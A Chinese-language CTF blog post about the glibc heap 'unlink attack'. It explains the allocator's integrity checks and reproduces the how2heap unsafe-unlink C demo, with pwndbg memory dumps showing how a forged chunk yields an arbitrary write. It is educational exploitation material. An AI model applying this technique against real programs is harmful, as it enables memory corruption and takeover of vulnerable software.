@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <title>
+        
+          unlink attack - hello word
+        
+    </title>
+
+    <link rel="canonical" href="http://yoursite-url/2019/07/07/unlink-attack/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS --> 
+    <link rel="stylesheet" href="/css/beantech.min.css">
+    
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <link rel="stylesheet" href="/css/widget.css">
+
+    <link rel="stylesheet" href="/css/rocket.css">
+
+    <link rel="stylesheet" href="/css/signature.css">
+
+    <link rel="stylesheet" href="/css/toc.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            background-image: url('wallhaven-89081.jpg')
+            /*post*/
+        
+    }
+    
+    #signature{
+        background-image: url('/img/signature/BeanTechSign-white.png');
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#PWN" title="PWN">PWN</a>
+                            
+                        </div>
+                        <h1>unlink attack</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by 骑猪满天飞 on
+                            2019-07-07
+                        </span>
+                    </div>
+                
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Hello Word</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Modify by Yu-Hsuan Yen -->
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1><span id="unlink-简介">unlink 简介</span></h1>
+<p>unlink用于将 chunk 从所在的空闲链表中取出来。基本过程如下：<br>
+<img src="unlink_smallbin_intro.png" alt="image"></p>
+<h1><span id="执行unlink时的检测">执行unlink时的检测：</span></h1>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// fd bk</span><br><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \`</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span><br><span class="line">if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="line">    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);               \</span><br></pre></td></tr></table></figure>
+<p>检查项总结：</p>
+<ul>
+<li>FD-&gt;BK=P,BK-&gt;FD=P</li>
+<li>chunk size是否等于next chunk(内存意义上的)的prev_size</li>
+</ul>
+<h1><span id="how2heap-unlink">how2heap unlink</span></h1>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uint64_t *chunk0_ptr;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, &quot;Welcome to unsafe unlink 2.0!\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;);</span><br><span class="line"></span><br><span class="line">	int malloc_size = 0x80; //we want to be big enough not to use fastbins</span><br><span class="line">	int header_size = 2;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0</span><br><span class="line">	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1</span><br><span class="line">	fprintf(stderr, &quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	fprintf(stderr, &quot;The victim chunk we are going to corrupt is at %p\n\n&quot;, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;We create a fake chunk inside chunk0.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;We setup the &apos;next_free_chunk&apos; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;);</span><br><span class="line">	chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);</span><br><span class="line">	fprintf(stderr, &quot;We setup the &apos;previous_free_chunk&apos; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;);</span><br><span class="line">	chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);</span><br><span class="line">	fprintf(stderr, &quot;Fake chunk fd: %p\n&quot;,(void*) chunk0_ptr[2]);</span><br><span class="line">	fprintf(stderr, &quot;Fake chunk bk: %p\n\n&quot;,(void*) chunk0_ptr[3]);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;);</span><br><span class="line">	uint64_t *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	fprintf(stderr, &quot;We shrink the size of chunk0 (saved as &apos;previous_size&apos; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;It&apos;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;);</span><br><span class="line">	chunk1_hdr[0] = malloc_size;</span><br><span class="line">	fprintf(stderr, &quot;If we had &apos;normally&apos; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;,(void*)chunk1_hdr[0]);</span><br><span class="line">	fprintf(stderr, &quot;We mark our fake chunk as free by setting &apos;previous_in_use&apos; of chunk1 as False.\n\n&quot;);</span><br><span class="line">	chunk1_hdr[1] &amp;= ~1;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;);</span><br><span class="line">	free(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;);</span><br><span class="line">	char victim_string[8];</span><br><span class="line">	strcpy(victim_string,&quot;Hello!~&quot;);</span><br><span class="line">	chunk0_ptr[3] = (uint64_t) victim_string;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;Original value: %s\n&quot;,victim_string);</span><br><span class="line">	chunk0_ptr[0] = 0x4141414142424242LL;</span><br><span class="line">	fprintf(stderr, &quot;New Value: %s\n&quot;,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>chunk0_ptr为全局变量指向chunk0的mem。</p>
+<p>申请chunk0和chunk1后堆栈如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x603000</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000091  </span><br><span class="line">0x603010:	0x0000000000000000	0x0000000000000000  &lt;--chunk0_ptr</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	0x0000000000000091  &lt;--chunk1</span><br><span class="line">0x6030a0:	0x0000000000000000	0x0000000000000000  </span><br><span class="line">0x6030b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>伪造fake_chunk并满足FD-&gt;BK=P,BK-&gt;FD=P：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk-&gt;fd=&amp;fake_chunk-3 </span><br><span class="line">fake_chunk-&gt;bk=&amp;fake_chunk-2 </span><br><span class="line"></span><br><span class="line">此时fake_chunk即为P，</span><br><span class="line">FD-&gt;bk=&amp;fake_chunk-3+3=&amp;fake_chunk=&amp;P</span><br><span class="line">BK-&gt;fd=&amp;fake_chunk-2+2=&amp;fake_chunk=&amp;P</span><br><span class="line">满足要求</span><br></pre></td></tr></table></figure>
+<p>gdb调试堆栈情况如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk:</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000091   &lt;--chunk0</span><br><span class="line">0x603010:	0x0000000000000000	0x0000000000000000   &lt;--fake_chunk (chunk0_ptr)</span><br><span class="line">0x603020:	0x0000000000602058 &lt;--fd	0x0000000000602060  &lt;--bk  </span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br><span class="line">FD:</span><br><span class="line">0x602058:	0x0000000000000000	0x00007ffff7dd2540</span><br><span class="line">0x602068:   0x0000000000000000	0x0000000000603010  &lt;-- (FD-&gt;BK=P)</span><br><span class="line"></span><br><span class="line">BK:</span><br><span class="line">0x602060 :	0x00007ffff7dd2540	0x0000000000000000</span><br><span class="line">0x602070 :	0x0000000000603010 &lt;--(BK-&gt;FD=P)	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>修改chunk1的prev_size为0x80，previous_in_use位为0.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x603000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x603010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603020:	0x0000000000602058	0x0000000000602060</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000080	0x0000000000000090  &lt;--chunk1_hdr</span><br><span class="line">0x6030a0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>free(chunk1)时,伪造的fake_chunk与free合并，fake_chunk将触发unlink操作：<br>
+P-&gt;fd-&gt;bk = P-&gt;bk.<br>
+P-&gt;bk-&gt;fd = P-&gt;fd.<br>
+P对应fake_chunk<br>
+P-&gt;fd-&gt;bk(*0x602070)=P-&gt;bk（0x602060）<br>
+P-&gt;bk-&gt;fd(*0x602070)=P-&gt;fd（0x602058）<br>
+堆结构如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x602070:	0x0000000000602058	0x0000000000000000</span><br><span class="line">0x602080:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>此时chunk0_ptr为（0x602058），chunk0_ptr[3]=*(chunk0_ptr+3)=*0x602070即chunk0_ptr。</p>
+<p>chunk0_ptr[3] = victim_string; 修改chunk0_ptr指向victim_string<br>
+chunk0_ptr[0] = 0x4141414142424242LL;修改victim_string的值。</p>
+<h1><span id="参考链接">参考链接</span></h1>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/</a></p>
+
+                
+
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    
+                        <li class="next">
+                            <a href="/2019/06/24/large-bin-attack/" data-toggle="tooltip" data-placement="top" title="large bin attack">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                <!-- duoshuo Share start -->
+                
+                <!-- 多说 Share end-->
+
+                <!-- 多说评论框 start -->
+                
+                <!-- 多说评论框 end -->
+
+                <!-- disqus comment start -->
+                
+                    <div class="comment">
+                        <div id="disqus_thread" class="disqus-thread"></div>
+                    </div>
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">unlink 简介</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">执行unlink时的检测：</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">how2heap unlink</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">参考链接</span></a></li></ol>
+        
+        </div>
+      </aside>
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#PWN" title="PWN">PWN</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="http://beantech.org" target="_blank">Bean Tech</a></li>
+                    
+                        <li><a href="http://blog.kaijun.rocks" target="_blank">Kaijun&#39;s Blog</a></li>
+                    
+                        <li><a href="http://huangxuan.me" target="_blank">Hux Blog</a></li>
+                    
+                        <li><a href="#" target="_blank">It Helps SEO</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- disqus embedded js code start (one page only need to embed once) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "your-disqus-ID";
+    var disqus_identifier = "http://yoursite-url/2019/07/07/unlink-attack/";
+    var disqus_url = "http://yoursite-url/2019/07/07/unlink-attack/";
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus embedded js code start end -->
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/zettt8214">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; 骑猪满天飞 2019 
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    re-Ported by <a href="http://beantech.org">BeanTech</a> | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=YenYuHsuan&repo=hexo-theme-beantech&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://yoursite-url/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-XXXXXXXX-X';
+    var _gaDomain = 'yoursite';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+<!-- Image to hack wechat -->
+<img src="http://yoursite-url/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
